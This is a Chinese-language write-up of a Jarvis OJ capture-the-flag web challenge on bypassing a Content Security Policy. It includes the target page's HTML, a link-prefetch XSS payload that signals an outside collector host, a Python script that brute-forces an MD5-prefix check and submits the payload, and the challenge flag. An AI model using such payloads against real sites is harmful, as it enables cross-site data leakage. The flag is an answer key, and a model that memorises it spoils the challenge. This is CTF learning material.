## 描述

题目入口：http://web.jarvisoj.com:32800/

Hint1: csp bypass

Hint1: 最近问机器人有没有挂掉的人很多，这里解释一下，机器人是用系统的corntab起的，除非题目一起挂了，不然机器人是不会挂的，如果题目可以正常访问但是做不出来请检查自己的payload，不要让我再重复回答机器人挂没挂这个问题了。

## 题解

```html
<!DOCTYPE html>
<html>
<head>
<title>Contact Site</title>
<link href="css/style.css" rel='stylesheet' type='text/css' />
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<script src="js/jquery-3.1.1.js"></script>
</head>
<body>
    <h1>Tell you secret to admin</h1>
    <div class="login-01">
            <form action="./" method="post">
            <ul>
                <li class="first">
          <a href="#" class=" icon user"></a><input name="name" type="text" class="text" value="Name" >
                    <div class="clear"></div>
                </li>
                <li class="first">
         <a href="#" class=" icon phone"></a><input name="phone" type="text" class="text" value="Phone">
                    <div class="clear"></div>
                </li>
                <li class="first">
                <h2>( PS：substr($verify,0,4) === '8521' )</h2></li>
            <a href="#" class=" icon email"></a><input name="verify" type="text" class="text" value="verify"  >
                          <div class="clear"></div>
                </li>
                      <li class="first">
                <li class="second">
          <a href="#" class=" icon msg"></a><textarea name="secret" value="Secret">Secret</textarea>
                    <div class="clear"></div>
                </li>
            </ul>
            <input type="submit" value="Submit" >
            <div class="clear"></div>
        </form>
    </div>
    <div class="copy-right">
        <div class="wrap">
            <p>Copyright &copy; 2017. Bendawang name All right reserved.</p>
        </div>
    </div>
</body>
</html>

```

先扫为敬。只有 `index.php` 和 `conn.php`，后者打开啥也没有。

发现网页上的 `( PS：substr($verify,0,4) === 'f291' )` 右边那个值是会变的，刷新一次变一次。但是尝试了各种提交后全是得到 `verify error!`，猜想应该不止 `verify` 那一项要正确，`message` 也要正确。

提示告诉我们 CSP bypass，所以去搜几篇 CSP 的文章：

- [CSP Level 3浅析&简单的bypass](https://lorexxar.cn/2016/08/08/ccsp/)
- [CSP策略及绕过方法](https://blog.csdn.net/qq_35078631/article/details/73732951)
- [gif bypass CSP?](https://lorexxar.cn/2016/04/20/gif-ccsp/)
- [使用 Wave 文件绕过 CSP 策略](https://mp.weixin.qq.com/s/ljBB5jStB7fcJq4cgdWnnw)
- [初探CSPBypass一些细节总结](https://xz.aliyun.com/t/318/)

然后再尝试发一次邮件，发现一直 `verify error!`，猜测 `$verify` 那里判断的是邮件的 MD5。。。我们尝试构造一次试试，OK，验证通过，待会 Admin 会来查看我们的邮件。所以应该就是要构造一个 xss 了。

先看一下网站的 CSP 配置：`Content-Security-Policy: default-src 'self'; script-src 'self'`

比较难，在这里注意，我们可以在发邮件前，在控制台试一试自己发送的代码是否能运行起来。

其实直接

```	html
<link rel="prefetch" href="http://xss/gg.php?t=123456">
```

就好了，但是本题不知道怎么挂掉了，一直收不到，我猜测是机器人的浏览器升级了？把 `prefetch` 给挡了？

不管了，反正这题我体验极差，发了不下 100 次 Payload，各种组合尝试，依然收不到，直接抄答案好了。

我写的代码

```python
import requests
import random, re, hashlib
url = 'http://web.jarvisoj.com:32800/'
secret = '''
<link rel="prefetch" href="http://xss.com/?x=gg">
'''.strip()
data = {
    'name': 'admin',
    'phone': 'Phone',
    'verify': '',
    'secret': secret,
}

sess = requests.session()
t = sess.get(url)
v = re.findall(r'''===\s'(\w\w\w\w)'\s''', t.text)[0]

while 1:
    m = hashlib.md5()
    s = str(random.randint(1, 1000000000))
    m.update(s.encode('utf-8'))
    md5 = m.hexdigest()
    if md5[:4] == v:
        data['verify'] = s
        break

print(data)

t = sess.post(url, data=data)

print(t.text)
```

## 答案

61dctf{c3p_m1ght_n4t_84_3ec0r1ty}
